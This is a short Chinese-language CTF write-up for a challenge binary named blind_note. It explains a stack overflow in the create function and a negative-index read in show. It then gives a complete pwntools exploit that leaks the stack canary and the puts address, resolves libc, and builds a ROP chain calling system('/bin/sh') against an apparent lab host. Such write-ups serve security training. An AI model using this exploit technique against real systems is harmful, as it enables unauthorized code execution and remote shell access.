checksec发现程序开启了canary保护。

ida可以发现create函数存在溢出行为，通过create不断地向上覆盖栈。但是存在canary保护，所以得考虑绕过canary。在show函数发现，没有检查日记index是否为负数，就确定偏移，利用它来输出canary值。

在程序中，输入66可以得到puts函数的真实地址，据此可以ROP得到shell。exp如下

```python
from pwn import *
from LibcSearcher import *
import ctypes

def create(num):
    io.recvuntil(">\n")
    io.sendline("1")
    io.sendline(str(num))

context(arch="amd64", os="linux", log_level="debug")

# io = process("./blind_note")
io = remote("172.21.4.12", 10103)

elf = ELF("./blind_note")
main_addr = elf.sym["main"]
popret = 0x400c63


# add a number to position 0
create(123)
# io.recvuntil(">\n")
# io.sendline("1")
# io.sendline("123")

# recv the puts_addr and calculate addr
io.recvuntil(">\n")
io.sendline("66")
io.recvuntil("This is my id:")
puts_addr = u64(io.recv(6).ljust(8, "\x00"))

libc = LibcSearcher("puts", puts_addr)
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
binsh_addr = libc_base + libc.dump("str_bin_sh")

# get canary
io.recvuntil(">\n")
io.sendline("2")
io.recvuntil("which one ?\n")
io.sendline("-10")
io.recvuntil("note num is : ")
canary1 = ctypes.c_uint32(int(io.recvline()))
print(canary1.value)

io.recvuntil(">\n")
io.sendline("2")
io.recvuntil("which one ?\n")
io.sendline("-9")
io.recvuntil("note num is : ")
canary2 = ctypes.c_uint32(int(io.recvline()))
print(canary2.value)

# padding and rop
for i in range(25):
    create(123)

create(canary1.value)
create(canary2.value)
create(123)
create(123)

create(popret & 0xffffffff)
create(popret >> 32)
create(binsh_addr & 0xffffffff)
create(binsh_addr >> 32)
create(system_addr & 0xffffffff)
create(system_addr >> 32)

io.interactive()
```

